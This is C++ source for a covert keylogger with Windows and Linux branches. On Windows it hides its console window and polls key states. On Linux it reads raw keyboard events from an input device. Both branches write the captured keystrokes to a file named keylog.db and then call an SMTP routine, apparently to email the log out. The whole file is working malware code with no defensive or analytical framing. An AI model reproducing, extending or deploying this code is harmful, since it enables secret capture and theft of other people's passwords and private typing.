#ifdef _WIN32
#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <time.h>
#include "smtp_attach.h"

using namespace std;

bool log(int key_stroke);

int main()
{
   int i;
   bool run = true;

   if(true)
   {
      HWND Stealth;
      AllocConsole();
      Stealth = FindWindowA("ConsoleWindowClass", NULL);
      ShowWindow(Stealth,0);
   }

   while(run)
   {
      for(i = 8; i <= 190; i++)
      {
         if(GetAsyncKeyState(i) == -32767)
         {
            run = log(i);
         }
      }
   }

   main_smtp();

   system("PAUSE");

   return 0;
}

bool log(int key_stroke)
{
   if((key_stroke == 1) || (key_stroke == 2))
   {
      return true;
   }

   FILE* myFile = fopen("keylog.db", "a+");
   time_t rawtime;
   time (&rawtime);

   printf("(%lu) %d=%s\n", rawtime, key_stroke, (char*) &key_stroke);

   if(key_stroke == VK_F2)
   {
      return false;
   }else
   {
      fprintf(myFile,"(%lu) %d=%s\n", rawtime, key_stroke, (char*) &key_stroke);
      fclose(myFile);
      return true;
   }
}
#endif

#ifdef __linux
#include <fcntl.h>
//using open;
#include <unistd.h>
#include <string>
using std::string;
#include "linux_keyrecord.h"
//#include "keydb.h"
#include "keytxt.h"
#include "keyrecord.h"
#include "keyvalue.h"
using namespace keylog;
#include "smtp-attach.h"


int main() {

	string device_filename;
	//string db_filename;
	string txt_filename;

	//device_filename = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
	device_filename = "/dev/input/event2";

	//db_filename = "keylog.db";
	txt_filename = "keylog.db";

	int device_file = open(device_filename.c_str(), O_RDONLY);
	//keylog_db::KeyDB keydb = keylog_db::KeyDB(db_filename);
	keylog_txt::KeyTXT keytxt = keylog_txt::KeyTXT(txt_filename);

	struct input_event event;

    bool running = true;
	while(running) {
        read(device_file, &event, sizeof(struct input_event));

        if(event.type == 1) {
            keylog::KeyRecord* keyRecord;

            keyRecord = new keylog_linux::KeyRecord(event);

            //keydb.insert(keyRecord);
            keytxt.insert(keyRecord);

            if(keyRecord->getValue() == keylog::value_esc) {
                running = false;
            }

            delete keyRecord;
        }
    }


    keytxt.close();

        //main_tls(fopen(db_filename.c_str(), "r"));

        //main_smtp();

    main_smtp();

	close(device_file);
}
#endif
